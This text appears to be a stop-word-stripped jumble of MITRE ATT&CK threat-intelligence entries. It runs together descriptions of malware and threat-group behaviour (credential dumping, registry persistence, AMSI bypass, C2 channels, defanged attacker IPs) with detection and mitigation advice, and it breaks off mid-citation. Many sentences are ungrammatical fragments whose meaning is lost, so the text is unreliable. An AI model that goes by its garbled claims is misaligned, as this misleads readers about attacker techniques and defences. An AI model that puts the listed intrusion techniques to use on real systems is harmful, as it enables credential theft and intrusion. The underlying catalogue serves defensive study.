[QakBot](https://attack.mitre.org/software/S0650) module proxy C2 communications.(Citation: Kaspersky QakBot September 2021) [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers change C2 servers.(Citation: Symantec Linfo 2012) [FunnyDream](https://attack.mitre.org/software/S1044) WMI Windows command remote machine.(Citation: Bitdefender FunnyDream Campaign November 2020) [BITTER](https://attack.mitre.org/groups/G1002) POST requests C2.(Citation: Cisco Talos Bitter Bangladesh 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016) Adversaries payloads execute technique. Identify block malicious software executed hijacking application control solutions capable blocking libraries loaded legitimate software. Monitor Registry creation services start safe mode. example, program forced start safe mode boot adding <code>\*</code> "Startup" name: <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\["\*Startup"="{Path}"]</code> adding key <code>HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal</code>.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019) installing service fails, [Elise](https://attack.mitre.org/software/S0081) writes file named svchost.exe saved %APPDATA%\Microsoft\Network.(Citation: Lotus Blossom Jun 2015) [Calisto](https://attack.mitre.org/software/S0274) collects bookmarks Google Chrome.(Citation: Securelist Calisto July 2018) [Bankshot](https://attack.mitre.org/software/S0239) command control communication.(Citation: McAfee Bankshot) Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. defend SYN floods, enable SYN Cookies. Monitor LSA process DLL loads. Windows 8.1 Windows Server 2012 R2 generate events unsigned SSP DLLs load LSA setting Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> AuditLevel = 8. (Citation: Graeber 2014) (Citation: Configure LSA) [HermeticWizard](https://attack.mitre.org/software/S0698) list hardcoded credentials authenticate NTLMSSP SMB shares remote systems.(Citation: ESET Hermetic Wizard March 2022) [EvilGrab](https://attack.mitre.org/software/S0152) capability capture keystrokes.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Cobalt Strike](https://attack.mitre.org/software/S0154) credentials commands spawn processes domain user account.(Citation: cobaltstrike manual)(Citation: CobaltStrike Daddy 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) [GoldenSpy](https://attack.mitre.org/software/S0493) established persistence running background autostart service.(Citation: Trustwave GoldenSpy June 2020)	 [Reaver](https://attack.mitre.org/software/S0172) creates shortcut file saves Startup folder establish persistence.(Citation: Palo Alto Reaver Nov 2017) [MarkiRAT](https://attack.mitre.org/software/S0652) BITS Utility connect C2 server.(Citation: Kaspersky Ferocious Kitten Jun 2021) (Citation: Checkpoint MosesStaff Nov 2021) [Babuk](https://attack.mitre.org/software/S0638) “WNetOpenEnumW” “WNetEnumResourceW” enumerate files network resources encryption.(Citation: McAfee Babuk February 2021) File Modification Configure browsers tasks regularly delete persistent cookies. [More_eggs](https://attack.mitre.org/software/S0284) capability gather OS version name.(Citation: Talos Cobalt July 2018)(Citation: Security Intelligence Eggs Aug 2019) [Cobalt Group](https://attack.mitre.org/groups/G0080) obfuscated scriptlets code victim’s machine, including XOR RC4.(Citation: Talos Cobalt July 2018)(Citation: Morphisec Cobalt Gang Oct 2018) endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [CHOPSTICK](https://attack.mitre.org/software/S0023) switch C2 channel current broken.(Citation: ESET Sednit 2) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) targeted presidential campaign staffers credential phishing e-mails.(Citation: Google Election Threats October 2020) Monitor activity cloud accounts detect abnormal malicious behavior, accessing normal function account account usage atypical hours. [SDBbot](https://attack.mitre.org/software/S0461) ability decrypt decompress payload enable code execution.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [Dtrack](https://attack.mitre.org/software/S0567) collect variety victim machines.(Citation: CyberBit Dtrack) [OceanSalt](https://attack.mitre.org/software/S0346) create reverse infected endpoint cmd.exe.(Citation: McAfee Oceansalt Oct 2018) [OceanSalt](https://attack.mitre.org/software/S0346) executed malicious macros.(Citation: McAfee Oceansalt Oct 2018) [Kinsing](https://attack.mitre.org/software/S0599) deployed Ubuntu container.(Citation: Aqua Kinsing April 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) commonly created shells victims' publicly accessible email servers, maintain access victim network download additional malicious files.(Citation: US-CERT TA18-074A) [MoonWind](https://attack.mitre.org/software/S0149) command return list running processes.(Citation: Palo Alto MoonWind March 2017) [APT28](https://attack.mitre.org/groups/G0007) performed timestomping victim files.(Citation: Crowdstrike DNC June 2016) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) <code>DirectoryList</code> enumerate files directory.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) C2 traffic [ADVSTORESHELL](https://attack.mitre.org/software/S0045) encrypted, encoded Base64 encoding.(Citation: Kaspersky Sofacy) [Metamorfo](https://attack.mitre.org/software/S0455)'s C2 communication encrypted OpenSSL.(Citation: Medium Metamorfo Apr 2020)  Linux, auditd alert time user's actual effective (this sudo). technique abusing normal functionality macOS Linux systems, sudo ability log input output based <code>LOG_INPUT</code> <code>LOG_OUTPUT</code> directives <code>/etc/sudoers</code> file. [Zebrocy](https://attack.mitre.org/software/S0251) <code>tasklist</code> <code>wmic process Capture, ExecutablePath</code> commands gather processes running system.(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018) [Pay2Key](https://attack.mitre.org/software/S0556) designated machines compromised network serve reverse proxy pivot channel communications C2.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Pay2Key November 2020) adversaries provisioned compromised infrastructure (ex: server command control), internet scans proactively discover compromised infrastructure. identifiable patterns services listening, certificates use, SSL/TLS negotiation features, response artifacts adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) scanned network infrastructure vulnerabilities operational planning.(Citation: District Court Indictment GRU Unit 74455 October 2020) [ELMER](https://attack.mitre.org/software/S0064) capable performing directory listings.(Citation: FireEye EPS Awakens 2) Ensure permissions disallow services permissions level created interacted user permission level. [Emissary](https://attack.mitre.org/software/S0082) injects DLL file newly spawned Internet Explorer process.(Citation: Lotus Blossom Dec 2015) [Imminent Monitor](https://attack.mitre.org/software/S0434) leveraged CreateProcessW() execute debugger.(Citation: QiAnXin APT-C-36 Feb2019) Regularly check component software critical services adversaries target persistence verify integrity systems identify unexpected made. [PUNCHBUGGY](https://attack.mitre.org/software/S0196) load DLL Rundll32.(Citation: FireEye Enemy FIN8 Aug 2016) [Maze](https://attack.mitre.org/software/S0449) created file named "startup_vrun.bat" Startup folder virtual machine establish persistence.(Citation: Sophos Maze VM September 2020) [KEYMARBLE](https://attack.mitre.org/software/S0271) gathers MAC address victim’s machine.(Citation: US-CERT KEYMARBLE Aug 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors developed custom webshells upload compromised servers.(Citation: FoxIT Wocao December 2019) [Sidewinder](https://attack.mitre.org/groups/G0121) e-mails malicious links credential harvesting websites.(Citation: ATT Sidewinder January 2021) [Nerex](https://attack.mitre.org/software/S0210) creates backdoor remote attackers download files compromised host.(Citation: Symantec Ristol 2012) [CostaBricks](https://attack.mitre.org/software/S0614) download additional payloads compromised host.(Citation: BlackBerry CostaRicto November 2020) [Seth-Locker](https://attack.mitre.org/software/S0639) execute commands command shell.(Citation: Trend Micro Ransomware February 2021) [NanoCore](https://attack.mitre.org/software/S0336) capability download activate additional modules execution.(Citation: DigiTrust NanoCore Jan 2017)(Citation: PaloAlto NanoCore Feb 2016) [H1N1](https://attack.mitre.org/software/S0132) kills disables services Windows Security Center, Windows Defender.(Citation: Cisco H1N1 2) [FIN8](https://attack.mitre.org/groups/G0061) cleared logs post compromise cleanup activities.(Citation: FireEye Enemy FIN8 Aug 2016) [OwaAuth](https://attack.mitre.org/software/S0072) filename owaauth.dll, legitimate file resides <code>%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\</code>; malicious file saved <code>%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\</code>.(Citation: Dell TG-3390) [gsecdump](https://attack.mitre.org/software/S0008) dump Windows password hashes SAM.(Citation: TrueSec Gsecdump) [Inception](https://attack.mitre.org/groups/G0100) open-source tools [LaZagne](https://attack.mitre.org/software/S0349).(Citation: Kaspersky Cloud Atlas August 2019) [Okrum](https://attack.mitre.org/software/S0439)'s loader check physical memory terminates host 1.5 Gigabytes physical memory total.(Citation: ESET Okrum July 2019) [Babuk](https://attack.mitre.org/software/S0638) multiple Windows API calls actions compromised hosts including discovery execution.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: Medium Babuk February 2021) [StoneDrill](https://attack.mitre.org/software/S0380) downloaded dropped temporary files scripts; additionally function upload files victims machine.(Citation: Kaspersky StoneDrill 2017)	 [Turla](https://attack.mitre.org/groups/G0010) AMSI bypass, patches in-memory amsi.dll, PowerShell scripts bypass Windows antimalware products.(Citation: ESET Turla PowerShell 2019) [SynAck](https://attack.mitre.org/software/S0242) manipulate Registry keys.(Citation: SecureList SynAck Doppelgänging 2018) [Gamaredon Group](https://attack.mitre.org/groups/G0047) Outlook VBA module infected systems send phishing emails malicious attachments employees organization.(Citation: ESET Gamaredon June 2020) (Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [DarkWatchman](https://attack.mitre.org/software/S0673) observed deleting original launcher installation.(Citation: Prevailion DarkWatchman 2021) (Citation: CISA AA20-239A BeagleBoyz August 2020) (Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018)(Citation: Symantec Cicada November 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) includes capability modify Beacon payload eliminate signatures unpacking methods.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [Cyclops Blink](https://attack.mitre.org/software/S0687) ability Linux API function `utime` change timestamps modified firmware update images.(Citation: NCSC Cyclops Blink February 2022) [IronNetInjector](https://attack.mitre.org/software/S0581) identify processes C# methods <code>GetProcessesByName</code> running [Tasklist](https://attack.mitre.org/software/S0057) Python <code>os.popen</code> function.(Citation: Unit 42 IronNetInjector February 2021 ) [SynAck](https://attack.mitre.org/software/S0242) clears event logs.(Citation: SecureList SynAck Doppelgänging 2018) [Shamoon](https://attack.mitre.org/software/S0140) overwriting features disk structure MBR.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) remote desktop gateways. [Sykipot](https://attack.mitre.org/software/S0018) SSL encrypting C2 communications.(Citation: Blasco 2013) [Bundlore](https://attack.mitre.org/software/S0482) disguised malicious .app file Flash Player update.(Citation: MacKeeper Bundlore Apr 2019) [NetTraveler](https://attack.mitre.org/software/S0033) reports window names keylogger provide application context.(Citation: Kaspersky NetTraveler) [APT28](https://attack.mitre.org/groups/G0007) victims proxies relay command traffic, instance compromised Georgian military email server hop NATO victims. tool acts proxy C2 victim router. [APT28](https://attack.mitre.org/groups/G0007) machine relay obscure communications [CHOPSTICK](https://attack.mitre.org/software/S0023) server.(Citation: FireEye APT28)(Citation: Bitdefender APT28 Dec 2015)(Citation: DOJ GRU Indictment Jul 2018) [Sidewinder](https://attack.mitre.org/groups/G0121) tools current time.(Citation: ATT Sidewinder January 2021) [FatDuke](https://attack.mitre.org/software/S0512) attempted mimic compromised user's traffic user agent installed browser.(Citation: ESET Dukes October 2019) [APT41](https://attack.mitre.org/groups/G0096) gained access production environments inject malicious code legitimate, signed files distribute users.(Citation: FireEye APT41 Aug 2019) [Shark](https://attack.mitre.org/software/S1019) encrypted encoded files C2 configuration.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) (Citation: Securelist APT10 March 2021) [CrackMapExec](https://attack.mitre.org/software/S0488) dump hashed passwords Active Directory Windows' Directory Replication Services API (DRSUAPI), Volume Shadow Copy.(Citation: CME Github September 2018) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. (Citation: CrowdStrike StellarParticle January 2022) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) add, modify, delete registry keys. changed proxy configuration victim modifying <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap</code> registry.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [BADNEWS](https://attack.mitre.org/software/S0128) command screenshot send C2 server.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018) [UNC2452](https://attack.mitre.org/groups/G0118) downloaded additional tools, [TEARDROP](https://attack.mitre.org/software/S0560) malware [Cobalt Strike](https://attack.mitre.org/software/S0154), compromised host initial compromise.(Citation: FireEye SUNBURST Backdoor December 2020) [CrackMapExec](https://attack.mitre.org/software/S0488) brute force credential authentication supplied list usernames single password.(Citation: CME Github September 2018) [Magic Hound](https://attack.mitre.org/groups/G0059) PowerShell execution privilege escalation.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)(Citation: DFIR Report APT35 ProxyShell March 2022) Ensure privilege principles applied resources reduce exposure data manipulation risk. [Chaes](https://attack.mitre.org/software/S0631) requires user malicious Word document execute attack.(Citation: Cybereason Chaes Nov 2020)  Monitor executed commands arguments attempt cloud permission settings.  Monitor newly constructed network connections received untrusted hosts, Sysmon Event 3 (Network connection) Image CMSTP.exe DestinationIP external. [Clambling](https://attack.mitre.org/software/S0660) ability set file attributes hidden.(Citation: Trend Micro DRBControl February 2020) Update software regularly include patches DLL side-loading vulnerabilities. [Anchor](https://attack.mitre.org/software/S0504) cmd.exe deletion routine.(Citation: Cyberreason Anchor December 2019) [Remsec](https://attack.mitre.org/software/S0125) perform DLL injection.(Citation: Kaspersky ProjectSauron Technical Analysis) Monitor newly constructed files leverage Office-based applications persistence startups. Limit privileges user accounts authorized administrators interact service service binary target path locations. Deny execution user directories file download directories temp directories able. [FruitFly](https://attack.mitre.org/software/S0277) ability list processes system.(Citation: objsee mac malware 2017) [Magic Hound](https://attack.mitre.org/groups/G0059) open-source penetration testing tools [Havij](https://attack.mitre.org/software/S0224), [sqlmap](https://attack.mitre.org/software/S0225), Metasploit, [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Check Rocket Kitten)(Citation: FireEye APT35 2018)(Citation: Check APT35 CharmPower January 2022) Monitor API calls leveraging computer's peripheral devices microphones webcams) applications voice video services) capture audio recordings purpose listening sensitive conversations gather information. Monitor unexpected Docker image build requests Docker daemon hosts environment. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors Trojans underground hacker websites.(Citation: McAfee Night Dragon) [Final1stspy](https://attack.mitre.org/software/S0355) creates Registry key establish persistence.(Citation: Unit 42 Nokki Oct 2018) [QakBot](https://attack.mitre.org/software/S0650) PowerShell download execute payloads.(Citation: IB Ransomware September 2020) [Bandook](https://attack.mitre.org/software/S0234) modules capable capturing audio.(Citation: EFF Manul Aug 2016) [Babuk](https://attack.mitre.org/software/S0638) ability unpack memory XOR.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: Medium Babuk February 2021) [APT30](https://attack.mitre.org/groups/G0013) [SHIPSHAPE](https://attack.mitre.org/software/S0028) malware air-gapped networks. [SHIPSHAPE](https://attack.mitre.org/software/S0028) targets removable drives spread systems modifying drive Autorun execute hiding legitimate document files copying executable folder legitimate document.(Citation: FireEye APT30) [Lazarus Group](https://attack.mitre.org/groups/G0032) downloaded files, malware, tools C2 compromised host.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: McAfee Lazarus Jul 2020)(Citation: ESET Lazarus Jun 2020)(Citation: Google TAG Lazarus Jan 2021)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus)(Citation: ESET Twitter Ida Pro Nov 2021) [jRAT](https://attack.mitre.org/software/S0283) WMIC identify anti-virus products installed victim’s machine firewall details.(Citation: jRAT Symantec Aug 2018) Launch Agents require files disk persistence monitored file monitoring applications. [Cuba](https://attack.mitre.org/software/S0625) packed payload delivered.(Citation: McAfee Cuba April 2021)  Users trained identify social engineering techniques spearphishing messages malicious links. [Anchor](https://attack.mitre.org/software/S0504) download additional payloads.(Citation: Cyberreason Anchor December 2019)(Citation: Medium Anchor DNS July 2020) Limit privileges user accounts authorized users edit rc.common file. [Windshift](https://attack.mitre.org/groups/G0112) Visual Basic 6 (VB6) payloads.(Citation: BlackBerry Bahamut) Block .scr files executed non-standard locations. Configure Office security settings enable Protected View, execute sandbox environment, block macros Policy. (Citation: Block Office Macros) types virtualization application microsegmentation mitigate impact compromise. Remove disable access systems, resources, infrastructure explicitly required externally. [PUNCHBUGGY](https://attack.mitre.org/software/S0196) establish AppCertDLLs Registry key.(Citation: FireEye Enemy FIN8 Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) XOR-based algorithm encrypt Tor clients dropped disk.(Citation: ProofPoint Ursnif Aug 2016)	[Ursnif](https://attack.mitre.org/software/S0386) droppers delivered password-protected zip files execute base64 encoded [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands.(Citation: Bromium Ursnif Mar 2017) [Denis](https://attack.mitre.org/software/S0354) deploys additional backdoors hacking tools system.(Citation: Cybereason Cobalt Kitty 2017) [Mori](https://attack.mitre.org/software/S1047) obfuscated FML.dll 200MB junk data.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Cannon](https://attack.mitre.org/software/S0351) list processes running system.(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018) [S-Type](https://attack.mitre.org/software/S0085) save file named `msdtc.exe`, legitimate Distributed Transaction Coordinator service binary.(Citation: Cylance Dust Storm)(Citation: DTC) [Darkhotel](https://attack.mitre.org/groups/G0012) malware repeatedly checks mouse cursor position determine real user system.(Citation: Lastline DarkHotel Time Decryption Nov 2015) [Flagpro](https://attack.mitre.org/software/S0696) encoded bidirectional data communications target C2 server Base64.(Citation: NTT Security Flagpro December 2021)  [Fox Kitten](https://attack.mitre.org/groups/G0117) files victim's cloud storage instances.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Dtrack](https://attack.mitre.org/software/S0567) save collected data disk, file formats, network shares.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) [Sidewinder](https://attack.mitre.org/groups/G0121) e-mails malicious links crafted specific targets.(Citation: ATT Sidewinder January 2021)(Citation: Cyble Sidewinder September 2020) [BlackMould](https://attack.mitre.org/software/S0564) enumerate local drives compromised host.(Citation: GALLIUM December 2019) [Bankshot](https://attack.mitre.org/software/S0239) collects files local system.(Citation: McAfee Bankshot) starts, [BADNEWS](https://attack.mitre.org/software/S0128) crawls victim's local drives collects documents extensions: .doc, .docx, .pdf, .ppt, .pptx, .txt.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors spawned `cmd.exe` process execute commands.(Citation: FoxIT Wocao December 2019)  [APT38](https://attack.mitre.org/groups/G0082) installed port monitoring tool, MAPMAKER, print active TCP connections local system.(Citation: FireEye APT38 Oct 2018) [BoomBox](https://attack.mitre.org/software/S0635) RunDLL32 execution.(Citation: MSTIC Nobelium Toolset 2021) [T9000](https://attack.mitre.org/software/S0098) searches removable storage devices files pre-defined list file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). matching files encrypted written local user directory.(Citation: Palo Alto T9000 Feb 2016) Variants [Kevin](https://attack.mitre.org/software/S1020) communicate DNS queries server constructed domain names embedded information.(Citation: Kaspersky Lyceum October 2021) [CrackMapExec](https://attack.mitre.org/software/S0488) discover password policies applied target system.(Citation: CME Github September 2018) [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping account password gaining access additional systems enterprise network resources. functionality acquire credentials ways, including credential vault DPAPI.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Oct 2015)(Citation: NCSC Joint Report Public Tools)(Citation: Cobalt Strike Manual 4.3 November 2020)	 [BadPatch](https://attack.mitre.org/software/S0337) establishes foothold adding link malware executable startup folder.(Citation: Unit 42 BadPatch Oct 2017) [Dridex](https://attack.mitre.org/software/S0384) module VNC.(Citation: Dell Dridex Oct 2015) [Volgmer](https://attack.mitre.org/software/S0180) variants port 8088 C2.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)(Citation: Symantec Volgmer Aug 2014) [Threat Group-3390](https://attack.mitre.org/groups/G0027) exploited SharePoint vulnerability CVE-2019-0604 CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 Exchange Server.(Citation: Trend Micro Iron Tiger April 2021) [PowerStallion](https://attack.mitre.org/software/S0393) XOR cipher encrypt command output written OneDrive C2 server.(Citation: ESET Turla PowerShell 2019) [BLINDINGCAN](https://attack.mitre.org/software/S0520) collected victim machine name, processor information, OS version, disk information, including type space available.(Citation: US-CERT BLINDINGCAN Aug 2020) [XAgentOSX](https://attack.mitre.org/software/S0161) keylogging functionality monitor active application windows write log, handle special characters, buffer default 50 characters sending C2 infrastructure.(Citation: XAgentOSX 2017) [MacSpy](https://attack.mitre.org/software/S0282) command control.(Citation: objsee mac malware 2017) [Emotet](https://attack.mitre.org/software/S0367) WMI execute powershell.exe.(Citation: Carbon Black Emotet Apr 2019) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) inject running processes compromised host.(Citation: CISA MAR SLOTHFULMEDIA October 2020) Monitor process activity (such unexpected processes spawning container host) attempt escape privileged container host.  [FIN5](https://attack.mitre.org/groups/G0053) maintains access victim environments [FLIPSIDE](https://attack.mitre.org/software/S0173) create proxy backup RDP tunnel.(Citation: Mandiant FIN5 GrrCON Oct 2016) Monitor execution commands arguments enumeration gathering domain accounts groups, <code>net user /domain</code> <code>net /domain</code>, <code>dscacheutil -q group</code>on macOS, <code>ldapsearch</code> Linux.

System network discovery techniques occur operation adversary learns environment, extent normal network operations. discovery data events viewed isolation, chain behavior lead activities, Lateral Movement, based obtained. [Kwampirs](https://attack.mitre.org/software/S0236) collects list accounts command <code>net users</code>.(Citation: Symantec Orangeworm April 2018) Monitor files unexpected modifications access permissions attributes  [TajMahal](https://attack.mitre.org/software/S0467) ability source libraries XZip/Xunzip zlib compress files.(Citation: Kaspersky TajMahal April 2019) [Bazar](https://attack.mitre.org/software/S0534) [Nltest](https://attack.mitre.org/software/S0359) tools domain.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) [Okrum](https://attack.mitre.org/software/S0439) loader executes payload left mouse button pressed times, avoid executed virtualized emulated environments.(Citation: ESET Okrum July 2019)  Monitor file delete alter generated artifacts host system, including logs captured files quarantined malware. [Inception](https://attack.mitre.org/groups/G0100) maintained persistence modifying Registry key 
 <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\</code>.(Citation: Kaspersky Cloud Atlas December 2014) [STARWHALE](https://attack.mitre.org/software/S1037) gather infected host.(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022) [StrifeWater](https://attack.mitre.org/software/S1034) collect user victim's machine.(Citation: Cybereason StrifeWater Feb 2022) [APT19](https://attack.mitre.org/groups/G0073) PowerShell commands execute payloads.(Citation: FireEye APT19) [Rover](https://attack.mitre.org/software/S0090) automatically collects files local removable drives based predefined list file extensions regular timeframe.(Citation: Palo Alto Rover) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [CALENDAR](https://attack.mitre.org/software/S0025) command cmd.exe execute commands.(Citation: Mandiant APT1 Appendix)  Monitor third-party application logging, messaging, artifacts abuse Outlook forms persistence compromised system. SensePost, tool [Ruler](https://attack.mitre.org/software/S0358) carry malicious rules, forms, attacks, released tool detect Ruler usage.(Citation: SensePost NotRuler) [NETEAGLE](https://attack.mitre.org/software/S0034) decrypt resources downloads requests RC4 key "ScoutEagle."(Citation: FireEye APT30) [LoudMiner](https://attack.mitre.org/software/S0451) <code>ps</code> command monitor running processes system.(Citation: ESET LoudMiner June 2019)	 [QakBot](https://attack.mitre.org/software/S0650) cmd.exe launch execute multiple C2 commands.(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021) Network intrusion detection prevention systems network signatures identify traffic specific protocols, TFTP, mitigate activity network level. Signatures unique indicators protocols based specific technique adversary tool, network configurations.  Monitor suspicious modification files hybrid identity authentication processes, configuration files. Monitor access certificates cryptographic material. <code>net time</code> command [Net](https://attack.mitre.org/software/S0039) determine local remote time.(Citation: TechNet Time) [StrongPity](https://attack.mitre.org/software/S0491) ability hide console window document search module user.(Citation: Talos Promethium June 2020) (Citation: DHS CISA AA22-055A MuddyWater February 2022) Ensure cloud accounts, privileged accounts, complex, unique passwords systems network. Passwords access rotated regularly. limits time credentials access resources credential compromised knowledge. Cloud service providers track access key age audit identify rotated.(Citation: AWS - IAM Console Practices) [TURNEDUP](https://attack.mitre.org/software/S0199) capable downloading additional files.(Citation: FireEye APT33 Sept 2017) [PLATINUM](https://attack.mitre.org/groups/G0068) transferred files Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.(Citation: PLATINUM June 2017) [APT3](https://attack.mitre.org/groups/G0022) downloader establishes SOCKS5 connection 192.157.198[.]103 TCP port 1913; server response verified, requests connection 192.184.60[.]229 TCP port 81.(Citation: FireEye Operation Double Tap) [PipeMon](https://attack.mitre.org/software/S0501) attempt gain administrative privileges token impersonation.(Citation: ESET PipeMon 2020) [Elderwood](https://attack.mitre.org/groups/G0066) leveraged multiple types spearphishing attempt user attachments.(Citation: Symantec Elderwood Sept 2012)(Citation: CSM Elderwood Sept 2012) Monitor newly constructed files forge cookies gain access applications Internet services. [Cobalt Strike](https://attack.mitre.org/software/S0154) techniques bypass Windows UAC.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) determine NetBios  IP addresses targets machines including domain controllers.(Citation: Cyberreason Anchor December 2019)(Citation: Cobalt Strike Manual 4.3 November 2020) Limit restrict program execution anti-virus software. MacOS, allowlist programs allowed plist tag. programs considered suspicious. [BloodHound](https://attack.mitre.org/software/S0521) collect domain members.(Citation: CrowdStrike BloodHound April 2018) [Sandworm Team](https://attack.mitre.org/groups/G0034) established social media accounts disseminate victim internal-only documents sensitive data.(Citation: District Court Indictment GRU Unit 74455 October 2020) Monitor newly executed daemons abuse launchctl execute commands programs. [BBSRAT](https://attack.mitre.org/software/S0127) [Expand](https://attack.mitre.org/software/S0361) decompress CAB file executable content.(Citation: Palo Alto Networks BBSRAT) [SLOWDRIFT](https://attack.mitre.org/software/S0218) collects sends C2.(Citation: FireEye APT37 Feb 2018) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors modified `IKEEXT` `PrintNotify` Windows services persistence.(Citation: Cybereason OperationCuckooBees 2022) [Bumblebee](https://attack.mitre.org/software/S1039) ability identify user name.(Citation: Google EXOTIC LILY March 2022) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) rundll32.exe Registry establish persistence.(Citation: Bitdefender APT28 Dec 2015) [LightNeuron](https://attack.mitre.org/software/S0395) SMTP C2.(Citation: ESET LightNeuron 2019) (Citation: Secureworks IRON VIKING ) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) network scanning module identify ICS-related ports.(Citation: Gigamon Berserk Bear October 2021) [Emotet](https://attack.mitre.org/software/S0367) ports 20, 22, 7080, 50000, addition ports commonly HTTP/S.(Citation: Talos Emotet Jan 2019) [NotPetya](https://attack.mitre.org/software/S0368) <code>wevtutil</code> Windows event logs.(Citation: Talos Nyetya June 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) <code>mshta.exe</code> execute downloaded initial access documents.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [BlackEnergy](https://attack.mitre.org/software/S0089) removed watermark enabling <code>TESTSIGNING</code> boot configuration option removing relevant strings <code>user32.dll.mui</code> system.(Citation: F-Secure BlackEnergy 2014) [Micropsia](https://attack.mitre.org/software/S0339) executes RAR tool recursively archive files based predefined list file extensions (*.xls, *.xlsx, *.csv, *.odt, *.doc, *.docx, *.ppt, *.pptx, *.pdf, *.mdb, *.accdb, *.accde, *.txt).(Citation: Radware Micropsia July 2018) [LOWBALL](https://attack.mitre.org/software/S0042) command control occurs HTTPS port 443.(Citation: FireEye admin@338) [OilRig](https://attack.mitre.org/groups/G0049) malware ISMAgent falls DNS tunneling mechanism unable reach C2 server HTTP.(Citation: OilRig ISMAgent July 2017) [DarkVishnya](https://attack.mitre.org/groups/G0105) created services shellcode loaders distribution.(Citation: Securelist DarkVishnya Dec 2018) [Gamaredon Group](https://attack.mitre.org/groups/G0047) WMI execute scripts discovery.(Citation: CERT-EE Gamaredon January 2021) (Citation: Check Rocket Kitten) [Lazarus Group](https://attack.mitre.org/groups/G0032) compromised legitimate domains, including hosted Italy, C2.(Citation: McAfee Lazarus Nov 2020) [SUGARDUMP](https://attack.mitre.org/software/S1042) search collect data specific Chrome, Opera, Edge, Firefox files, including folders string `Profile` name.(Citation: 